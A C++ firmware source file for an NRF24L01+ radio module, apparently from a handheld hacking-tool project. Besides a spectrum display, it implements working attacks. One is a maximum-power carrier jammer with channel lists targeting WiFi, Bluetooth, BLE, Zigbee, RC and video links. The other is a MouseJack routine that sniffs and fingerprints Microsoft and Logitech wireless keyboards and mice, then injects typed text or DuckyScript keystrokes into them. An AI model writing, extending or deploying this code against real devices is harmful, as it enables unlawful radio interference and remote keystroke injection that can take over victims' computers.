//
// NRF24L01+ module — spectrum, jammer, MouseJack
//

#include "NRF24Screen.h"
#include "core/AchievementManager.h"
#include "core/ScreenManager.h"
#include "core/Device.h"
#include "core/ConfigManager.h"
#include "core/PinConfigManager.h"
#include "screens/module/ModuleMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/actions/InputTextAction.h"
#include "ui/actions/InputSelectAction.h"
#include "ui/views/ProgressView.h"
#include <esp_random.h>

// DuckyScript payloads live here; created on demand before the picker opens.
static constexpr const char* kMjDuckyDir = "/unigeek/ducky";

// ══════════════════════════════════════════════════════════════
// ═══════════════ CHANNEL LISTS (jammer) ═══════════════════
// ══════════════════════════════════════════════════════════════

static const uint8_t kChTest[] = {
  50, 52, 54, 56, 58, 60, 62, 64, 66, 68, 70, 72, 74, 76, 78, 80, 2,  4,  6,  8,
  10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36, 38, 40, 42, 44, 46, 48
};
static const uint8_t kChWifi[] = {
  2, 7, 12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72, 77
};
static const uint8_t kChBle[] = {
  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,
  22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41
};
static const uint8_t kChBleAdv[]    = { 37, 38, 39, 1, 2, 3, 25, 26, 27, 79, 80, 81 };
static const uint8_t kChBt[]        = {
  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15, 16, 17,
  18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33,
  34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
  50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65,
  66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80
};
static const uint8_t kChUsb[]       = {
  32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 66, 68, 70
};
static const uint8_t kChVideo[]     = {
  60, 62, 64, 66,  68,  70,  72,  74,  76,  78,  80,  82,  84,  86,  88,  90, 92,
  94, 96, 98, 100, 102, 104, 106, 108, 110, 112, 114, 116, 118, 120, 122, 124
};
static const uint8_t kChRc[]        = {
  1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39
};
static const uint8_t kChZigbee[]    = {
  4,  5,  6,  9,  10, 11, 14, 15, 16, 19, 20, 21, 24, 25, 26, 29, 30, 31,
  34, 35, 36, 39, 40, 41, 44, 45, 46, 49, 50, 51, 54, 55, 56, 59, 60, 61,
  64, 65, 66, 69, 70, 71, 74, 75, 76, 79, 80, 81
};
static const uint8_t kChFull[]      = {
  1,   2,   3,   4,   5,   6,   7,   8,   9,   10,  11,  12,  13,  14,  15,  16,
  17,  18,  19,  20,  21,  22,  23,  24,  25,  26,  27,  28,  29,  30,  31,  32,
  33,  34,  35,  36,  37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,
  49,  50,  51,  52,  53,  54,  55,  56,  57,  58,  59,  60,  61,  62,  63,  64,
  65,  66,  67,  68,  69,  70,  71,  72,  73,  74,  75,  76,  77,  78,  79,  80,
  81,  82,  83,  84,  85,  86,  87,  88,  89,  90,  91,  92,  93,  94,  95,  96,
  97,  98,  99,  100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112,
  113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124
};

static const uint8_t* const kChLists[] = {
  kChTest, kChWifi, kChBle, kChBleAdv, kChBt, kChUsb, kChVideo, kChRc, kChZigbee, kChFull
};
static const int kChCounts[] = {
  (int)sizeof(kChTest),
  (int)sizeof(kChWifi),
  (int)sizeof(kChBle),
  (int)sizeof(kChBleAdv),
  (int)sizeof(kChBt),
  (int)sizeof(kChUsb),
  (int)sizeof(kChVideo),
  (int)sizeof(kChRc),
  (int)sizeof(kChZigbee),
  (int)sizeof(kChFull)
};

static const char* const kJamModeNames[] = {
  "Test", "WiFi", "BLE", "BLE Adv Pri", "Bluetooth",
  "USB", "Video Stream", "RC", "Zigbee", "Full"
};

// ══════════════════════════════════════════════════════════════
// ═══════════════ HID TABLE (MouseJack) ════════════════════
// ══════════════════════════════════════════════════════════════

// ASCII 0x20-0x7E → {modifier, keycode}
// modifier 0x02 = LSHIFT
static const NRF24Screen::HidKey kAsciiHid[] = {
  {0,0x2C},{2,0x1E},{2,0x34},{2,0x20},{2,0x21},{2,0x22},{2,0x24},{0,0x34},
  {2,0x26},{2,0x27},{2,0x25},{2,0x2E},{0,0x36},{0,0x2D},{0,0x37},{0,0x38},
  {0,0x27},{0,0x1E},{0,0x1F},{0,0x20},{0,0x21},{0,0x22},{0,0x23},{0,0x24},
  {0,0x25},{0,0x26},{2,0x33},{0,0x33},{2,0x36},{0,0x2E},{2,0x37},{2,0x38},
  {2,0x1F},
  {2,0x04},{2,0x05},{2,0x06},{2,0x07},{2,0x08},{2,0x09},{2,0x0A},{2,0x0B},
  {2,0x0C},{2,0x0D},{2,0x0E},{2,0x0F},{2,0x10},{2,0x11},{2,0x12},{2,0x13},
  {2,0x14},{2,0x15},{2,0x16},{2,0x17},{2,0x18},{2,0x19},{2,0x1A},{2,0x1B},
  {2,0x1C},{2,0x1D},
  {0,0x2F},{0,0x31},{0,0x30},{2,0x23},{2,0x2D},{0,0x35},
  {0,0x04},{0,0x05},{0,0x06},{0,0x07},{0,0x08},{0,0x09},{0,0x0A},{0,0x0B},
  {0,0x0C},{0,0x0D},{0,0x0E},{0,0x0F},{0,0x10},{0,0x11},{0,0x12},{0,0x13},
  {0,0x14},{0,0x15},{0,0x16},{0,0x17},{0,0x18},{0,0x19},{0,0x1A},{0,0x1B},
  {0,0x1C},{0,0x1D},
  {2,0x2F},{2,0x31},{2,0x30},{2,0x35}
};

// ══════════════════════════════════════════════════════════════
// ═══════════════ INIT ═════════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onInit() {
  _cePin  = (int8_t)PinConfig.getInt(PIN_CONFIG_NRF24_CE,  PIN_CONFIG_NRF24_CE_DEFAULT);
  _csnPin = (int8_t)PinConfig.getInt(PIN_CONFIG_NRF24_CSN, PIN_CONFIG_NRF24_CSN_DEFAULT);

  if (_cePin < 0 || _csnPin < 0) {
    ShowStatusAction::show("Set NRF24 CE/CSN pins first");
    Screen.goBack();
    return;
  }

  ProgressView::progress("Detecting NRF24...", 30);
  if (!_radioBegin()) {
    ShowStatusAction::show("NRF24 not found!");
    Screen.goBack();
    return;
  }
  _radioEnd();
  ProgressView::finish();

  _specScanCh = 0;
  _showMenu();
}

bool NRF24Screen::inhibitPowerSave() {
  return _state != STATE_MENU;
}
bool NRF24Screen::inhibitPowerOff() {
  return _state == STATE_JAMMER_RUNNING || _state == STATE_SPECTRUM ||
         _state == STATE_MJ_SCAN;
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ MENU TRANSITIONS ═════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::_showMenu() {
  _state = STATE_MENU;
  snprintf(_titleBuf, sizeof(_titleBuf), "NRF24L01");
  setItems(_mainItems);
}

bool NRF24Screen::_radioBegin() {
  if (!Uni.Spi || _cePin < 0 || _csnPin < 0) return false;
  return _nrf.begin(Uni.Spi, _cePin, _csnPin);
}

void NRF24Screen::_radioEnd() {
  _nrf.end();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ ITEM SELECTION ═══════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onItemSelected(uint8_t index) {
  if (_state == STATE_MENU) {
    if (index == 0) {
      // ── Spectrum ──────────────────────────────────────────
      if (!_radioBegin()) {
        ShowStatusAction::show("NRF24 not found!");
        render();
        return;
      }
      auto* r = _nrf.radio();
      r->setAutoAck(false);
      r->disableCRC();
      r->setAddressWidth(2);
      static const uint8_t noiseAddr[][2] = {
        {0x55,0x55}, {0xAA,0xAA}, {0xA0,0xAA},
        {0xAB,0xAA}, {0xAC,0xAA}, {0xAD,0xAA}
      };
      for (uint8_t i = 0; i < 6; i++) r->openReadingPipe(i, noiseAddr[i]);
      r->setDataRate(RF24_1MBPS);
      memset(_specCh,    0, sizeof(_specCh));
      memset(_specPeak,  0, sizeof(_specPeak));
      memset(_specPeakT, 0, sizeof(_specPeakT));
      _specMode    = 0;
      _specScanCh  = 0;
      _chromeDrawn = false;
      _state       = STATE_SPECTRUM;
      snprintf(_titleBuf, sizeof(_titleBuf), "2.4G Spectrum");
      render();
      if (Achievement.inc("nrf24_spectrum") == 1) Achievement.unlock("nrf24_spectrum");

    } else if (index == 1) {
      // ── Jammer ────────────────────────────────────────────
      _startJammer();

    } else if (index == 2) {
      // ── MouseJack ─────────────────────────────────────────
      _setupMjScan();
    }
    return;
  }

  if (_state == STATE_MJ_SCAN && _mjCount > 0) {
    // PRESS on a target — pick an attack: type text, or run a Ducky script.
    if (index < _mjCount) {
      static const InputSelectAction::Option kAttackOpts[] = {
        {"Inject Text",  "text" },
        {"Ducky Script", "ducky"},
      };
      const char* choice = InputSelectAction::popup("Attack", kAttackOpts, 2);
      if (choice) {
        if (strcmp(choice, "text") == 0) {
          String text = InputTextAction::popup("Type text");
          if (text.length() > 0) _injectMjText(index, text);
        } else {
          _pickDuckyScript(index);
        }
      }
      _chromeDrawn = false;
      render();
    }
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ UPDATE ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onUpdate() {
  if (_state == STATE_SPECTRUM) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _radioEnd();
        _showMenu();
        return;
      }
      if (dir == INavigation::DIR_PRESS) {
        _specMode    = (_specMode + 1) % 3;
        _chromeDrawn = false;
      }
    }
    _scanSpectrum();
    if (_specScanCh == 0) {
      // Full sweep complete — render and log peak
      uint8_t maxLevel = 0; uint8_t maxCh = 0;
      for (int i = 0; i < kSpecCh; i++) {
        if (_specCh[i] > maxLevel) { maxLevel = _specCh[i]; maxCh = i; }
      }
      render();
    }
    return;
  }

  if (_state == STATE_JAMMER_RUNNING) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        auto* r = _nrf.radio();
        r->stopConstCarrier();
        r->powerDown();
        _radioEnd();
        _showMenu();
        return;
      }
      if (dir == INavigation::DIR_RIGHT || dir == INavigation::DIR_DOWN) {
        // Next mode
        _jamModeIndex = (_jamModeIndex + 1) % kJamModes;
        _jamHopIndex  = 0;
        _jamReshuffle = true;
        _chromeDrawn  = false;
        render();
      } else if (dir == INavigation::DIR_LEFT || dir == INavigation::DIR_UP) {
        // Prev mode
        _jamModeIndex = (_jamModeIndex + kJamModes - 1) % kJamModes;
        _jamHopIndex  = 0;
        _jamReshuffle = true;
        _chromeDrawn  = false;
        render();
      } else if (dir == INavigation::DIR_PRESS) {
        // Toggle hop mode: sequential <-> random (FHSS)
        _jamHopMode   = (_jamHopMode + 1) & 1;
        _jamHopIndex  = 0;
        _jamReshuffle = true;
        _chromeDrawn  = false;
        render();
      }
    }
    // Jam in a tight SPI hop loop for ~10 ms, then service input/render.
    uint32_t deadline = millis() + 10;
    while (millis() < deadline) _jamStep();
    if (millis() - _lastRender >= 1000) {
      _lastRender = millis();
      render();
    }
    return;
  }

  if (_state == STATE_MJ_SCAN) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _radioEnd();
        _showMenu();
        return;
      }
      if (dir == INavigation::DIR_UP) {
        if (_mjSelected > 0) { _mjSelected--; render(); }
        return;
      }
      if (dir == INavigation::DIR_DOWN) {
        if (_mjSelected < (int)_mjCount - 1) { _mjSelected++; render(); }
        return;
      }
      if (dir == INavigation::DIR_PRESS) {
        onItemSelected(_mjSelected);
        return;
      }
    }
    _stepMjScan();
    if (millis() - _lastRender > 400) {
      _lastRender = millis();
      render();
    }
    return;
  }

  ListScreen::onUpdate();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ RENDER ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onRender() {
  if (_state == STATE_SPECTRUM)       { _renderSpectrum();     return; }
  if (_state == STATE_JAMMER_RUNNING) { _renderJammerStatus(); return; }
  if (_state == STATE_MJ_SCAN)        { _renderMjScan();       return; }
  ListScreen::onRender();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ BACK ═════════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onBack() {
  switch (_state) {
    case STATE_MENU:
      _radioEnd();
      Screen.goBack();
      break;
    case STATE_SPECTRUM:
      _radioEnd();
      _showMenu();
      break;
    case STATE_JAMMER_RUNNING:
      _nrf.radio()->stopConstCarrier();
      _radioEnd();
      _showMenu();
      break;
    case STATE_MJ_SCAN:
      _radioEnd();
      _showMenu();
      break;
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ SPECTRUM ═════════════════════════════════════
// ══════════════════════════════════════════════════════════════

uint16_t NRF24Screen::_specBarColor(uint8_t level) {
  if (level > 85) return TFT_RED;
  if (level > 65) return 0xFD20;
  if (level > 45) return TFT_YELLOW;
  if (level > 25) return TFT_GREEN;
  return TFT_DARKGREEN;
}

void NRF24Screen::_scanSpectrum() {
  auto* r = _nrf.radio();
  if (!r) return;
  int i = _specScanCh;
  digitalWrite(_cePin, LOW);
  r->setChannel(i);
  r->startListening();
  delayMicroseconds(170);
  r->stopListening();

  if (r->testRPD()) {
    _specCh[i] = (uint8_t)min(100, (_specCh[i] + 100) / 2);
  } else {
    _specCh[i] = (uint8_t)((_specCh[i] * 3) / 4);
  }

  _specScanCh = (i + 1) % kSpecCh;

  // Update peaks once per full sweep
  if (_specScanCh == 0) {
    for (int j = 0; j < kSpecCh; j++) {
      if (_specCh[j] >= _specPeak[j]) {
        _specPeak[j]  = _specCh[j];
        _specPeakT[j] = kPeakHoldSweeps;
      } else if (_specPeakT[j] > 0) {
        _specPeakT[j]--;
      } else {
        if (_specPeak[j] > 2) _specPeak[j] -= 2;
        else _specPeak[j] = 0;
      }
    }
  }
}

void NRF24Screen::_renderSpectrum() {
  static const char* const kModeLabel[] = {"Peak", "Bars", "Dev"};
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();
  static constexpr int kFooterH = 11;
  int barAreaH = bh - kFooterH - 2;
  int mL = 2;
  int dW = bw - mL * 2;

  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    lcd.setTextSize(1);
    lcd.setTextDatum(TL_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    int fy = by + bh - kFooterH + 1;
    lcd.drawString("2.400", bx + 2, fy, 1);
    lcd.drawCentreString("2.462", bx + bw / 2, fy, 1);
    lcd.drawRightString("2.525", bx + bw - 2, fy, 1);
    lcd.drawFastHLine(bx, by + barAreaH + 1, bw, TFT_DARKGREY);
    lcd.drawString(kModeLabel[_specMode], bx + 2, by + 2, 1);
    _chromeDrawn = true;
  }

  uint8_t maxLevel = 0, maxCh = 0;
  for (int i = 0; i < kSpecCh; i++) {
    int x    = bx + mL + (i * dW) / kSpecCh;
    int xN   = bx + mL + ((i + 1) * dW) / kSpecCh;
    int w    = max(1, xN - x);
    uint8_t lv = _specCh[i];
    if (lv > maxLevel) { maxLevel = lv; maxCh = i; }

    int barH  = (lv * barAreaH) / 100;
    int peakH = (_specPeak[i] * barAreaH) / 100;
    if (barH < barAreaH) lcd.fillRect(x, by, w, barAreaH - barH, TFT_BLACK);
    if (barH > 0)        lcd.fillRect(x, by + barAreaH - barH, w, barH, _specBarColor(lv));

    if (_specMode == 0 && peakH > barH && peakH > 0) {
      int py = by + barAreaH - peakH;
      if (py >= by) lcd.fillRect(x, py, w, 1, TFT_WHITE);
    }
  }
  if (maxLevel > 10) {
    char buf[10];
    snprintf(buf, sizeof(buf), "pk:%d", (int)maxCh);
    lcd.setTextColor(TFT_YELLOW, TFT_BLACK);
    lcd.fillRect(bx + bw - 46, by + 2, 44, 8, TFT_BLACK);
    lcd.drawRightString(buf, bx + bw - 2, by + 2, 1);
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ JAMMER ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

// Fisher-Yates shuffle of an index table via the hardware RNG.
static void shuffleChannels(uint8_t* arr, size_t count) {
  for (size_t i = count - 1; i > 0; i--) {
    size_t j = esp_random() % (i + 1);
    uint8_t tmp = arr[i];
    arr[i] = arr[j];
    arr[j] = tmp;
  }
}

void NRF24Screen::_startJammer() {
  if (!_radioBegin()) {
    ShowStatusAction::show("NRF24 not found!");
    render();
    return;
  }
  auto* r = _nrf.radio();

  r->setPALevel(RF24_PA_MAX);
  r->startConstCarrier(RF24_PA_MAX, 50);
  r->setAddressWidth(5);
  r->setPayloadSize(2);
  if (!r->setDataRate(RF24_2MBPS)) {
    if (!r->setDataRate(RF24_1MBPS)) {
      r->setDataRate(RF24_250KBPS);
    }
  }

  _jamModeIndex = 0;
  _jamHopIndex  = 0;
  _jamHopMode   = 0;
  _jamReshuffle = true;
  _lastRender   = millis();
  _chromeDrawn  = false;
  _state = STATE_JAMMER_RUNNING;
  snprintf(_titleBuf, sizeof(_titleBuf), "NRF Jammer");
  if (Achievement.inc("nrf24_jammer") == 1) Achievement.unlock("nrf24_jammer");
  render();
}

// A single carrier hop, following the active mode's channel list. In random
// mode the index table is reshuffled on each full pass so the order keeps
// changing — harder for an adaptive target to dodge.
void NRF24Screen::_jamStep() {
  const uint8_t* channels = kChLists[_jamModeIndex];
  int count = kChCounts[_jamModeIndex];

  _jamHopIndex++;
  if (_jamHopIndex >= count) {
    _jamHopIndex  = 0;
    _jamReshuffle = true;
  }

  uint8_t idx;
  if (_jamHopMode == 1) {
    if (_jamReshuffle) {
      for (int i = 0; i < count; i++) _jamShuffled[i] = (uint8_t)i;
      shuffleChannels(_jamShuffled, count);
      _jamReshuffle = false;
    }
    idx = _jamShuffled[_jamHopIndex];
  } else {
    idx = (uint8_t)_jamHopIndex;
  }

  _nrf.radio()->setChannel(channels[idx]);
}

void NRF24Screen::_renderJammerStatus() {
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();

  // Static chrome — redrawn when mode / hop change (via _chromeDrawn = false)
  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    lcd.setTextSize(1);
    lcd.setTextDatum(TL_DATUM);

    lcd.setTextColor(TFT_GREEN, TFT_BLACK);
    lcd.drawString("JAMMING", bx + 4, by + 4, 1);

    char line[28];
    lcd.setTextColor(TFT_YELLOW, TFT_BLACK);
    snprintf(line, sizeof(line), "MODE: %s", kJamModeNames[_jamModeIndex]);
    lcd.drawString(line, bx + 4, by + 4 + bh / 5, 1);

    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    snprintf(line, sizeof(line), "HOP : %s", _jamHopMode == 0 ? "Sequential" : "FHSS");
    lcd.drawString(line, bx + 4, by + 4 + bh / 5 * 2, 1);

    lcd.drawString("</>: Mode  OK: Hop", bx + 4, by + bh - 22, 1);
    lcd.drawString("<: Stop",            bx + 4, by + bh - 12, 1);
    _chromeDrawn = true;
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ MOUSEJACK ════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::_setupMjScan() {
  if (!_radioBegin()) {
    ShowStatusAction::show("NRF24 not found!");
    render();
    return;
  }
  auto* r = _nrf.radio();
  if (!r) return;
  // Promiscuous ESB capture: 2-byte "address" of alternating preamble bytes,
  // CRC off, 2 Mbps, full 32-byte payload. Real packets are recovered and
  // validated in software by _esbDecode().
  r->setAutoAck(false);
  r->disableCRC();
  r->setAddressWidth(2);
  r->setDataRate(RF24_2MBPS);
  r->setPALevel(RF24_PA_MAX);
  r->setPayloadSize(32);
  r->setRetries(0, 0);
  r->flush_rx();
  r->flush_tx();
  static const uint8_t noiseAddr[][2] = {
    {0x55,0x55}, {0xAA,0xAA}, {0xA0,0xAA},
    {0xAB,0xAA}, {0xAC,0xAA}, {0xAD,0xAA}
  };
  for (uint8_t i = 0; i < 6; i++) r->openReadingPipe(i, noiseAddr[i]);
  r->setChannel(2);
  r->startListening();

  memset(_mjTargets, 0, sizeof(_mjTargets));
  _mjCount    = 0;
  _mjSelected = 0;
  _mjScanCh   = 2;
  _mjMsSeq    = 0;
  _mjHopMs    = millis();
  _lastRender = millis();
  _chromeDrawn = false;
  _state = STATE_MJ_SCAN;
  snprintf(_titleBuf, sizeof(_titleBuf), "MouseJack");
  render();
  if (Achievement.inc("nrf24_mousejack") == 1) Achievement.unlock("nrf24_mousejack");
}

void NRF24Screen::_stepMjScan() {
  auto* r = _nrf.radio();
  if (!r) return;

  // Drain everything queued on the current channel before hopping.
  uint8_t buf[32];
  int guard = 0;
  while (r->available() && guard++ < 8) {
    r->read(buf, 32);
    _esbDecode(buf, 32, (uint8_t)_mjScanCh);
  }

  // Sweep the ESB range (channels 2-84) with a short dwell per channel.
  if (millis() - _mjHopMs >= 3) {
    _mjHopMs = millis();
    r->stopListening();
    _mjScanCh = (_mjScanCh >= 84) ? 2 : _mjScanCh + 1;
    r->setChannel(_mjScanCh);
    r->startListening();
  }
}

// CRC16-CCITT, MSB-first, used to validate a decoded ESB packet.
uint16_t NRF24Screen::_crc16Update(uint16_t crc, uint8_t byte, uint8_t bits) {
  crc = crc ^ ((uint16_t)byte << 8);
  while (bits--) {
    if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
    else              crc = crc << 1;
  }
  return crc & 0xFFFF;
}

// Recover a real Enhanced ShockBurst packet from a promiscuous capture. The
// preamble lock is not byte-aligned, so try the raw buffer and a 1-bit
// right-shifted copy; accept a candidate only if its CRC16 checks out, then
// extract the 5-byte address and payload for fingerprinting.
void NRF24Screen::_esbDecode(const uint8_t* raw, uint8_t size, uint8_t ch) {
  if (size < 10) return;
  if (size > 37) size = 37;

  uint8_t buf[37];
  memcpy(buf, raw, size);

  for (int offset = 0; offset < 2; offset++) {
    if (offset == 1) {
      memcpy(buf, raw, size);
      for (int x = size - 1; x >= 0; x--) {
        if (x > 0) buf[x] = (buf[x - 1] << 7) | (buf[x] >> 1);
        else       buf[x] = buf[x] >> 1;
      }
    }

    // Payload length lives in the upper 6 bits of the PCF byte.
    uint8_t payloadLength = buf[5] >> 2;
    if (payloadLength == 0 || payloadLength > (size - 9)) continue;

    // Extract the transmitted CRC (9-bit-aligned within the byte stream).
    uint16_t crcGiven = ((uint16_t)buf[6 + payloadLength] << 9) |
                        ((uint16_t)buf[7 + payloadLength] << 1);
    crcGiven = (crcGiven << 8) | (crcGiven >> 8);
    if (buf[8 + payloadLength] & 0x80) crcGiven |= 0x0100;

    uint16_t crcCalc = 0xFFFF;
    for (int x = 0; x < 6 + payloadLength; x++) crcCalc = _crc16Update(crcCalc, buf[x], 8);
    crcCalc = _crc16Update(crcCalc, buf[6 + payloadLength] & 0x80, 1);
    crcCalc = (crcCalc << 8) | (crcCalc >> 8);

    if (crcCalc != crcGiven) continue;

    uint8_t addr[5];
    memcpy(addr, buf, 5);

    uint8_t esbPayload[32];
    for (int x = 0; x < payloadLength; x++)
      esbPayload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);

    _fingerprintPayload(esbPayload, payloadLength, addr, ch);
    return;
  }
}

// Classify a decoded ESB payload by its Microsoft / Logitech signature.
void NRF24Screen::_fingerprintPayload(const uint8_t* payload, uint8_t size,
                                      const uint8_t* addr, uint8_t ch) {
  if (size == 19) {
    if (payload[0] == 0x08 && payload[6] == 0x40) { _addMjTarget(addr, 5, ch, 1); return; }
    if (payload[0] == 0x0A)                       { _addMjTarget(addr, 5, ch, 2); return; }
  }
  if (payload[0] == 0x00) {
    bool isLog = false;
    if (size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F)) isLog = true;
    if (size == 22 && payload[1] == 0xD3)                         isLog = true;
    if (size == 5  && payload[1] == 0x40)                         isLog = true;
    if (isLog) { _addMjTarget(addr, 5, ch, 3); return; }
  }
}

void NRF24Screen::_addMjTarget(const uint8_t* addr, uint8_t addrLen, uint8_t ch, uint8_t type) {
  for (uint8_t i = 0; i < _mjCount; i++) {
    if (_mjTargets[i].addrLen == addrLen && memcmp(_mjTargets[i].addr, addr, addrLen) == 0) {
      _mjTargets[i].ch = ch;
      return;
    }
  }
  if (_mjCount >= kMjMax) return;

  MjTarget& t = _mjTargets[_mjCount];
  memcpy(t.addr, addr, addrLen);
  t.addrLen = addrLen;
  t.ch   = ch;
  t.type = type;
  t.active = true;

  static const char* const kTypeNames[] = {"?", "MS", "MS+", "LOG"};
  snprintf(_mjAddrBufs[_mjCount], sizeof(_mjAddrBufs[0]),
    "%s %02X:%02X:%02X ch%d",
    kTypeNames[type & 3],
    addr[0], addr[1], addr[2], ch
  );
  if (_mjCount == 0 && Achievement.inc("nrf24_mj_found") == 1) Achievement.unlock("nrf24_mj_found");
  _mjCount++;
  _chromeDrawn = false;
  if (Uni.Speaker) Uni.Speaker->playNotification();
}

void NRF24Screen::_renderMjScan() {
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();

  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    _chromeDrawn = true;
  }

  if (_mjCount == 0) {
    lcd.setTextSize(1);
    lcd.setTextColor(TFT_WHITE, TFT_BLACK);
    lcd.drawCentreString("Scanning...", bx + bw / 2, by + bh / 3, 1);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    char chBuf[12];
    snprintf(chBuf, sizeof(chBuf), "ch %d", _mjScanCh);
    lcd.drawCentreString(chBuf, bx + bw / 2, by + bh / 2, 1);
    return;
  }

  static constexpr int kRowH = 18;
  lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
  for (int i = 0; i < (int)_mjCount && (i * kRowH) < bh; i++) {
    int rowY = by + i * kRowH;
    bool sel = (i == _mjSelected);
    uint16_t bg = sel ? Config.getThemeColor() : TFT_BLACK;
    uint16_t fg = TFT_WHITE;

    Sprite sp(&lcd);
    sp.createSprite(bw, kRowH);
    sp.fillSprite(TFT_BLACK);
    if (sel) sp.fillRoundRect(0, 2, bw, kRowH - 4, 3, bg);
    sp.setTextColor(fg, bg);
    sp.drawString(_mjAddrBufs[i], 4, kRowH / 2 - 4);
    sp.pushSprite(bx, rowY);
    sp.deleteSprite();
  }
  if (_mjCount > 0) {
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawCentreString("OK: inject text", bx + bw / 2, by + bh - 10, 1);
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ HID INJECTION ════════════════════════════════
// ══════════════════════════════════════════════════════════════

bool NRF24Screen::_asciiToHid(char c, HidKey& out) {
  if (c < 0x20 || c > 0x7E) return false;
  out = kAsciiHid[c - 0x20];
  return out.key != 0;
}

// ── Tuning ──────────────────────────────────────────────────────
static constexpr int kMjRetransmits = 5;
static constexpr int kMjInterKeyMs  = 10;

// ── DuckyScript key-name table ──────────────────────────────────
static const struct { const char* name; uint8_t mod; uint8_t key; } kDuckyKeys[] = {
  {"ENTER",0,0x28},   {"RETURN",0,0x28},  {"ESCAPE",0,0x29},  {"ESC",0,0x29},
  {"BACKSPACE",0,0x2A},{"TAB",0,0x2B},    {"SPACE",0,0x2C},   {"CAPSLOCK",0,0x39},
  {"DELETE",0,0x4C},  {"DEL",0,0x4C},     {"INSERT",0,0x49},  {"HOME",0,0x4A},
  {"END",0,0x4D},     {"PAGEUP",0,0x4B},  {"PAGEDOWN",0,0x4E},
  {"UP",0,0x52},      {"UPARROW",0,0x52}, {"DOWN",0,0x51},    {"DOWNARROW",0,0x51},
  {"LEFT",0,0x50},    {"LEFTARROW",0,0x50},{"RIGHT",0,0x4F},  {"RIGHTARROW",0,0x4F},
  {"PRINTSCREEN",0,0x46},{"SCROLLLOCK",0,0x47},{"PAUSE",0,0x48},{"BREAK",0,0x48},
  {"F1",0,0x3A},{"F2",0,0x3B},{"F3",0,0x3C},{"F4",0,0x3D},{"F5",0,0x3E},{"F6",0,0x3F},
  {"F7",0,0x40},{"F8",0,0x41},{"F9",0,0x42},{"F10",0,0x43},{"F11",0,0x44},{"F12",0,0x45},
  {"CTRL",0x01,0},{"CONTROL",0x01,0},{"SHIFT",0x02,0},{"ALT",0x04,0},
  {"GUI",0x08,0}, {"WINDOWS",0x08,0},{"WIN",0x08,0}, {"COMMAND",0x08,0},
  {"MENU",0,0x65},{"APP",0,0x65},
};

bool NRF24Screen::_mjAbort() {
  if (Uni.Nav && Uni.Nav->wasPressed())
    return Uni.Nav->readDirection() == INavigation::DIR_BACK;
  return false;
}

// Switch the radio from promiscuous RX to TX aimed at one target.
void NRF24Screen::_setupTxForTarget(const MjTarget& t) {
  auto* r = _nrf.radio();
  if (!r) return;
  r->stopListening();
  r->setAutoAck(false);
  r->disableCRC();
  r->setDataRate(RF24_2MBPS);
  r->setPALevel(RF24_PA_MAX);
  r->setAddressWidth(5);
  r->setChannel(t.ch);
  r->setRetries(0, 0);
  r->flush_rx();
  r->flush_tx();
  r->openWritingPipe(t.addr);
  r->setPayloadSize((t.type == 3) ? 10 : 19);
}

